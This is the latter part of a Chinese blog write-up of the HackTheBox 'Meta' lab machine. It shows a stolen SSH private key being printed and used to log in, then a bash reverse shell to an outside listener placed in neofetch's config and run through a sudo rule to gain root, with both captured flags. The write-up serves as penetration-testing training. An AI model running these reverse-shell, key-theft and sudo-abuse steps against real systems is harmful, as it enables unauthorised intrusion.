+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@meta:/dev/shm$ ls -al<br>ls -al<br>total 16<br>drwxrwxrwt  2 root     root      120 Mar 15 14:10 .<br>drwxr-xr-x 16 root     root     3080 Mar 15 01:33 ..<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:44 0wned<br>-rw-r--r--  1 thomas   thomas     54 Mar 15 13:53 0wned1<br>-rw-r--r--  1 thomas   thomas   2590 Mar 15 14:11 id_rsa<br>-rw-r--r--  1 www-data www-data  422 Mar 15 14:00 poc.svg<br>www-data@meta:/dev/shm$ cat id_rsa<br>cat id_rsa<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5<br>x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV<br>qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu<br>ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0<br>yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP<br>nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb<br>7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs<br>Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2<br>EAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/<br>8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH<br>cZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E<br>vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5<br>H2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR<br>3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9<br>78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk<br>KLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE<br>iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc<br>eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv<br>kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc<br>Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5<br>Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS<br>sLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG<br>n7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA<br>wQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay<br>JfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3<br>8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx<br>I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw<br>o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT<br>qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM<br>N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS<br>1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um<br>j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19<br>keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9<br>M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe<br>bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>获取到私钥很nice!!!</p>
+<p>这里还需要注意把本地的id_rsa权限改成600才能连接成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod 600 id_rsa<br></code></pre></td></tr></table></figure>
+
+<p>终端连接ssh妥妥的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(parallels㉿kali-linux-2021-3)-[~/Desktop/work/meta]<br>└─$ ssh thomas@10.10.11.140 -i id_rsa<br>Linux meta 4.19.0-17-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Mar 15 14:25:20 2022 from 10.10.14.17<br>thomas@meta:~$ w<br> 14:30:00 up 12:57,  1 user,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>thomas   pts/5    10.10.14.17      14:27    0.00s  0.00s  0.00s w<br>thomas@meta:~$ <span class="hljs-built_in">id</span><br>uid=1000(thomas) gid=1000(thomas) <span class="hljs-built_in">groups</span>=1000(thomas)<br></code></pre></td></tr></table></figure>
+
+<p>查看user.txt文件获取Flag</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">thomas@meta:~$ <span class="hljs-built_in">cat</span> user.txt <br>e4393d0aa3def6331ec9f41206703347<br></code></pre></td></tr></table></figure>
+
+<h5 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">thomas@meta:~$ ls -al<br>total 36<br>drwxr-xr-x 5 thomas thomas 4096 Mar 15 14:25 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config # 里面是一个neofetch<br>drwx------ 3 thomas thomas 4096 Mar 15 14:25 .gnupg # 密码学软件,与PGP类似<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh<br>-rw-r----- 1 root   thomas   33 Mar 15 01:33 user.txt<br><br></code></pre></td></tr></table></figure>
+
+<p>发现可以root权限运行的程序neofetch(Neofetch 是一个简单但有用的命令行系统信息工具，它用 Bash 编写。它会收集有关系统软硬件的信息，并在终端中显示结果。)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">thomas@meta:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> thomas on meta:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    env_keep+=XDG_CONFIG_HOME<br><br>User thomas may run the following commands on meta:<br>    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot; <span class="hljs-comment"># 这里</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这里利用.config&#x2F;neofetch&#x2F;config.conf配置文件提升权限</p>
+<p>在文件中添加</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.39/4444 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Dar3n1y/cdn-images@latest/blog-images/2022/04/17/20220417-0131-17.png" srcset="/img/loading.gif" lazyload alt="截屏2022-04-16 20.19.53"></p>
+<p>设置XDG_CONFIG_HOME变量</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> XDG_CONFIG_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>本地开启监听</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nc -lvvp 4444 <br></code></pre></td></tr></table></figure>
+
+<p>指定root去执行(这里-u参数应该可以不要)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo -u root /usr/bin/neofetch \&quot;\&quot;<br></code></pre></td></tr></table></figure>
+
+<p>获取root权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(parallels㉿kali-linux-2021-3)-[~/Desktop]<br>└─$ nc -lvvp 4444                                                                                           1 ⨯<br>listening on [any] 4444 ...<br>connect to [10.10.14.39] from artcorp.htb [10.10.11.140] 45348<br>root@meta:/home/thomas<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>root@meta:/home/thomas<span class="hljs-comment"># cd ~</span><br><span class="hljs-built_in">cd</span> ~<br>root@meta:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>conf<br>root.txt<br>root@meta:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>11df04949c30506126899e46fd5245d8<br></code></pre></td></tr></table></figure>
+
+<h3 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h3><ol>
+<li>绑定hosts</li>
+<li>Fuzz资产(ffuf工具)</li>
+<li>文件上传解析漏洞(CVE-2021-22204-exiftool)拿shell</li>
+<li>检索文件利用ImageMgick的命令注入提权user</li>
+<li>neofetch提root</li>
+</ol>
+<p>发现一个好工具rlwrap,可以在shell里面来回翻</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+        <a href="/tags/%E9%9D%B6%E6%9C%BA/">#靶机</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Meta</div>
+      <div>http://example.com/2022/03/05/HackTheBox-Meta/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Dar3n1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 5, 2022</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Updated on</div>
+          <div>April 17, 2022</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/05/%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%BF%87%E7%A8%8B%E4%B8%ADKali%E9%87%8D%E5%90%AF%E6%97%A0%E5%9B%BE%E5%BD%A2GUI%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" title="一次打靶过程中Kali重启无图形GUI解决方法">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一次打靶过程中Kali重启无图形GUI解决方法</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/25/Hexo-Github-Pages%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F/" title="Hexo+Github Pages部署博客系统">
+                        <span class="hidden-mobile">Hexo+Github Pages部署博客系统</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
